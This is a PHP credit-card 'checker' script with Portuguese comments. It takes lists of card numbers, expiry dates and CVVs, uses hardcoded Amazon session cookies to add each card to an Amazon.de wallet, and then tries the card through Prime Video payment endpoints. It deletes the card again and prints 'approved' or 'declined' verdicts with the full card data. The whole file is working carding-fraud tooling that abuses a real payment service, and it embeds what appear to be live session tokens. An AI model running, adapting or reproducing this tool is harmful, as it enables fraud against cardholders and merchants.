<?php

error_reporting(0);
DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
extract($_GET);
}

function deletarCookies() {
if (file_exists("cookie.txt")) {
unlink("cookie.txt");
}
}
function multiexplode ($delimiters,$string){
$ready = str_replace($delimiters, $delimiters[0], $string);
$launch = explode($delimiters[0], $ready);
return  $launch;}

function GetStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];

function value($str,$find_start,$find_end)
{
$start = @strpos($str,$find_start);
if ($start === false) 
{
return "";
}
    
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

############### MUDAR MES ###############################

switch ($mes) {
case '01': $mes = '1'; break;
case '02': $mes = '2'; break;
case '03': $mes = '3'; break;
case '04': $mes = '4'; break;
case '05': $mes = '5'; break;
case '06': $mes = '6'; break;
case '07': $mes = '7'; break;
case '08': $mes = '8'; break;
case '09': $mes = '9'; break;
case '10': $mes = '10'; break;
case '11': $mes = '11'; break;
case '12': $mes = '12'; break;
}

############### MUDAR ANO ###############################

/*switch ($ano) { 
case '2022':$ano = '22';break; 
case '2023':$ano = '23';break; 
case '2024':$ano = '24';break; 
case '2025':$ano = '25';break; 
case '2026':$ano = '26';break; 
case '2027':$ano = '27';break; 
case '2028':$ano = '28';break; 
case '2029':$ano = '29';break; 
case '2030':$ano = '30';break; 
case '2031':$ano = '31';break; 
case '2032':$ano = '32';break; 
case '2033':$ano = '33';break; 
}*/

############### PUXAR BIN ###############################

function bin ($cc){

$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);

############### SEPARAR CC ##############################

$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);

############### PUXAR TEMPO ########################

$time = time();

############### VARIAVEIS DO CHK ########################

$id = 'A2EUH4A436WEOP';

$cookie1 = 'Cookie: session-id=261-7769552-1934700; sp-cdn="L5Z9:BR"; ubid-acbde=258-4307067-0416648; lc-acbde=en_GB; session-token=4IPVSux5boPtvLjpTWuw6A5YJgZMCvRLac1ZNk88PYd5ydwIQwYf2KuiUkctDRgQ+j2NwN5+C5T3bkwBOpzlmwoIO4QV94UX5ndyvUIgPOGF68WhEY7iSMoLy3JtyROUKFfIyWLkDtH+W7MEDxXhrY01SZUKOuqlZrHPmX/rwZqn+TkSs+AnYHMll8G05u6zU3BR0P5dOdT0WbnrCn5Uf1LHKO8Cvhk7qQJlyqWzsm+JyQFASyd/MHqugpn0gI0H; x-acbde=9WfZjEu2fwbmdv9IEr8Dcs1pzQ39i4UGHQYkanc2ELVrkJIw2VyiDP4GiSaQSlcy; at-acbde=Atza|IwEBIBcpjXD0jYO-rywzOQFG0SVo92b-tJ_RdzgY_5w5cuuukDZEu2DWwbhpKSpnmKAdjzlh0abogc7J0nwHDShn_0chNsBjvC55TdlRJUwPgS8-JwCD0Wkqda_hWxKxx8pcVZc4hyqUBbTctc5odF8qV5RS9CuN-HfAaeS-scYfqbm7Ce3NHSFi0tuIbbEny--6je6BXTrwhDQFLDnYmgBbgSC4; sess-at-acbde="tIMSPfeHygKhHY6vsADGs4JQJuU7mJJdm6cc/My3Ggo="; sst-acbde=Sst1|PQFYbRMtniCmI_uISIE428O2CaZht17ITFqOa-BPPw1XQTvhNSzP2aqKCjdu4uHfOULgi7Ng5SWpLtsRfGV_ye8BmIqr4lYXRp_gf9mdm_HEReu2bN-lXKTJGaRvctlFxVIZQFCJfw9llTByWmoJGFgKVV7t_afZRImlgymLRd_mctknxB2uUR7aqFAye0Wu1qUBx9bpkNqfy8vSBgKi5JnTcwvHdr_tjQbSmh8pKui_3LFqHtMowHctvUPb4iOM2KHyvBsfFUype-brru-Z7uxDJpS3f1AkWqL3XjZjctXMb1U; session-id-time=2082787201l; i18n-prefs=EUR; csm-hit=tb:9VNJ4SKWBABBP8BTPVKP+s-B7HPPSRPQYJ9JE5Y9X61|1676746460517&t:1676746460517&adb:adblk_no';



$cookie2 = 'Cookie: session-id=146-9232820-5838411; i18n-prefs=USD; lc-main-av=pt_BR; ubid-main-av=132-1078345-0733538; av-timezone=America/Sao_Paulo; x-main-av="YTbVq2hMXMjgzYFBfKK6?3D2XIrfr28?kNY2vgnNt?kyhgBo?9?gpIwbVmPdUrbD"; sess-at-main-av="crdRWSRxccdec0yNzN4ToknaaHFAcTQRxb4fZ49xp8w="; at-main-av=Atza|IwEBIBr9d-ExdVaSbhFWH5hrusM2Mf01ioiIxWYiHqoD7yuDVrLdHbiE3KD4i2vCOx0sevun7THJTQyvUHUwyAJj_jv3Y76xOnWrzLEhoAgGdrNia4UUfn2GEJj-4vtgErad9EBMKMP0ajpGAkr9G80H89Ed0oS1zr3HP0IQSzJMJe6UlnXU6hc0looDTbf6feBXslhNooCYX_3fDcDMki5u_n9IQ-AMYsBpKpcrPLoAxE0rWIfOJYZtoqqHOtKaCHY2ONaAFicaNAIVDOBZdvzP_W5L0hSNoNrXuIJN1DfACx3fq8uWtmZfFHFTsLRoL-UO0ws; session-token="BA+PjvkjOoGl0QrHuZAQIZCmKvASodOpXLkkCUT7tLYJxbPjflo7ixAnIGNOEnM9JmXP3cCpjocxsjnzoECiszTjpMKBcSZsLOdX7ApK8StTCJDplNJEogsV21qJrsTsFlx8wIMipZ5NSGDmMPxXD3l8AXm5vhXod0hZLyJJMPLmyutxaPqa19zqZBAPjmY529j8RHdxuZ48VCK1fbFQ5+t5BpvhBnyPDJ6vS2YBxHRKeg8SZSp9bS+wdP/L8LqcLR0vCJR1ClVoM/4l7LkMylBHABVLoPINm7J/qT87wlfOEUdUvPfPZg=="; av-profile=cGlkPWFtem4xLmFjdG9yLnBlcnNvbi5vaWQuQTNEVE0xSEY1QzBTUE8mdGltZXN0YW1wPTE2NzY3NDY0MjM4MzImdmVyc2lvbj12MQ.g9nPPmwr8lvNkPuCkiFEdBrHeaB97DRz4_SbOAIbZ7Q0AAAAAQAAAABj8R63cmF3AAAAAPgWC9WfHH8iB-olH_E9xQ; session-id-time=2082787201l; csm-hit=tb:TXKF6HKXS3PAC38Q8YER+s-NHFXY0ETR64HJN2NN1FQ|1676746428322&t:1676746428322&adb:adblk_no';


######### curll 1 Add pela alemanha #########

$url = "https://www.amazon.de/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo";

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: www.amazon.de',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'dnt: 1',
'x-requested-with: mark.via.gp',
'sec-fetch-site: none',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie1.''

));

$retorno = curl_exec($ch);

$t1 = getStr($retorno, 'YA:Wallet","serializedState":"','"');
$token = getStr($retorno, '":{"selectedInstrumentId":"','"');

######### curll 2 #########

$url = 'https://apx-security.amazon.de/cpe/pm/register';

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

$post = 'widgetState='.$t1.'&returnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3Flanguage%3Den%26_encoding%3DUTF8%26ref_%3Dapx_interstitial&clientId=YA%3AWallet&usePopover=false&maxAgeSeconds=900&iFrameName=ApxSecureIframe-pp-vVYztS-5&parentWidgetInstanceId='.$token.'&hideAddPaymentInstrumentHeader=true&creatablePaymentMethods=CC';

//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: apx-security.amazon.de',
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/zX1Xwydg7uOg',
'User-Agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://apx-security.amazon.de',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.amazon.de/',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie1.''

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$retorno = curl_exec($ch);

####### token #######

$t2 = getStr($retorno, 'ppw-widgetState" value="','"');

###### curl 3 #########

$url = 'https://apx-security.amazon.de/payments-portal/data/widgets2/v1/customer/'.$id.'/continueWidget?sif_profile=APX-Encrypt-All-EU';

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

$post = 'ppw-widgetEvent%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widgetState='.$t2.'&ie=UTF-8&ppw-getNameOnAccount=Jefferson+rodrigues&ppw-accountHolderName=Jefferson+rodrigues&addCreditCardNumber='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'';

//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: apx-security.amazon.de',
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/zX1Xwydg7uOg',
'User-Agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://apx-security.amazon.de',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://apx-security.amazon.de/cpe/pm/register',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie1.''

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$retorno = curl_exec($ch);

####### token ########

$t3 = getStr($retorno, 'ppw-widgetState\" value=\"','\"');

###### crull 4 ########

$url = 'https://apx-security.amazon.de/payments-portal/data/widgets2/v1/customer/'.$id.'/continueWidget?sif_profile=APX-Encrypt-All-EU';

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

$post = 'ppw-widgetEvent%3ASavePaymentMethodDetailsEvent=&ppw-jsEnabled=true&ppw-widgetState='.$t3.'&ie=UTF-8';

//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: apx-security.amazon.de',
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/zX1Xwydg7uOg',
'User-Agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://apx-security.amazon.de',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://apx-security.amazon.de/cpe/pm/register',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie1.''

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$retorno = curl_exec($ch);

######### Token #########

$t4 = getStr($retorno, 'paymentInstrumentId":"','"');



############### Mandar pro BR ########################

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_a?workflowType=PaymentFixup-TVOD');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.primevideo.com',
    'X-Requested-With: XMLHttpRequest',
    'dpr: 1',
    'downlink: 10',
    'sec-ch-ua-platform: "Windows"',
    'device-memory: 8',
    'Widget-Ajax-Attempt-Count: 0',
    'rtt: 50',
    'sec-ch-ua-mobile: ?0',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'viewport-width: 1920',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'sec-ch-viewport-width: 1920',
    'sec-ch-dpr: 1',
    'Origin: https://www.amazon.com',
    'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo&',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ''.$cookie2.'',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widgetState='.$ppwwidgetState.'&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection='.$data_address_id.'');
$retorno = curl_exec($ch);
 
 ############# TOKEN #############
   
$t5 = getStr($retorno, 'ppw-widgetState" value="','"');

######### BR 2 #########

$url = 'https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/'.$id.'/continueWidget';

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

$post = 'ppw-jsEnabled=true&ppw-widgetState='.$t5.'&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D'.$t4.'%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=';
//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: www.primevideo.com',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'widget-ajax-attempt-count: 0',
'apx-widget-info: Subs:AmazonVideo/mobile/XqXfnzhSaZOJ',
'user-agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.primevideo.com',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.primevideo.com/region/na/gp/video/signup/ref=dvah?continueWorkflow=1&deviceTypeId=A36B5UCBCZO3WW&workflowType=Acquisition',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie2.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$return = curl_exec($ch);

########## Remove Cartao ###########

$url = 'https://www.amazon.de/payments-portal/data/widgets2/v1/customer/'.$id.'/continueWidget';

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

$post = 'ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22'.$t4.'%22%7D=&ppw-jsEnabled=true&ppw-widgetState='.$t1.'&ie=UTF-8';
//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: www.amazon.de',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'widget-ajax-attempt-count: 0',
'apx-widget-info: YA:MPO/mobile/rzcBeMQN9nQa',
'user-agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.amazon.de',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.amazon.de/cpe/yourpayments/wallet',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie1.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$retorno = curl_exec($ch);

######## Token ########

$t6 = getStr($retorno, 'ppw-widgetState\" value=\"','\"');

######## Remove Cartão 2 #########

$url = 'https://www.amazon.de/payments-portal/data/widgets2/v1/customer/'.$id.'/continueWidget';

$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";

$post = 'ppw-widgetEvent%3ADeleteInstrumentEvent=&ppw-jsEnabled=true&ppw-widgetState='.$t6.'&ie=UTF-8';

//CURL

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: www.amazon.de',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'widget-ajax-attempt-count: 0',
'apx-widget-info: YA:MPO/mobile/rzcBeMQN9nQa',
'user-agent: Mozilla/5.0 (Linux; Android 12; moto g200 5G Build/S1RXS32.50-13-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.amazon.de',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.amazon.de/cpe/yourpayments/wallet',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookie1.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$retorno = curl_exec($ch);

sleep(1); 
################# VER SE REMOVEU CARTÃO ####################
if(strpos($retorno,  'Deine Zahlungsmethode wurde erfolgreich entfernt.')) { 
	
	$msg = '✅';
	}else{
		$msg = '❌';
		}
		
		
########### Aprovada #############

if (strpos($return, 'payStationVerificationId":"","preferenceId":"')) { 



  exit("<i><b><span class='badge badge-success' style='color:black'>✔ Aprovada </span> ➔ </span><span class='badge badge-primary' style='color:black'> ".$cc."|".$mes."|".$ano."|".$cvv." </span> ➜ <span class='badge badge-info' style='color:black'> " . $bin . " </span> ➜</span> <span class='badge badge-success' style='color:black'> Cartao Aprovado (Removido : $msg)</span> </span> <br>");


}



############# REPROVADA #############

else if (strpos($return, 'Houve um problema')) {  
	    

    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info">Cartão Recusado (Removido : '.$msg.')</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');



############# REPROVADA #############
      
}else if (strpos($return, 'incorreto')) { 
	    


    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info">Cartão Inválido  (Removido : '.$msg.')</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');


############# REPROVADA #############
      
     }
else if (strpos($return, 'There was a problem')) {  
	    

    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info" style="color:black" >Cartão Recusado (Removido : '.$msg.')</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');


############# TROCAR COOKIES  #############
} else {
    exit('<b><span class="badge badge-danger">Reprovada</span> ➜ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ➜ '.$bin.' ➜ <span class="badge badge-info"> internal instability (Removido : '.$msg.')</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');

        

                }
          
        



   
